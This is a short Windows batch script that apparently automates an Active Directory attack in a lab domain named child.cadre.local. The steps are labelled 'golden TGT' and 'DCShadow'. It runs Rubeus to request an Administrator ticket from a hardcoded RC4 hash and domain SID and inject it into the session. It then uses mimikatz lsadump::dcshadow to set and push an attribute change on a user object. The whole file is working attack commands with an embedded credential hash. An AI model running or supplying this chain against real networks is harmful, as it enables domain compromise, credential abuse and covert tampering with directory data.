@echo off
cd /d C:\Tools\ADTools
echo === STEP1 GOLDEN TGT ===
Rubeus.exe asktgt /user:Administrator /domain:child.cadre.local /rc4:b6c370f260f2ec4a9eabaedf34882ec1 /sid:S-1-5-21-2616196951-1941128886-767624593 /ptt 1> wt102b-1-tgt.out 2>&1
echo === STEP2 DCShadow SET ===
mimikatz.exe "lsadump::dcshadow /object:intern_blue /attribute:description /value:WT102-DCShadow-MARKER" 1> wt102b-2-set.out 2>&1
echo === STEP3 DCShadow PUSH ===
mimikatz.exe "lsadump::dcshadow /push" 1> wt102b-3-push.out 2>&1
echo === ALL DONE ===
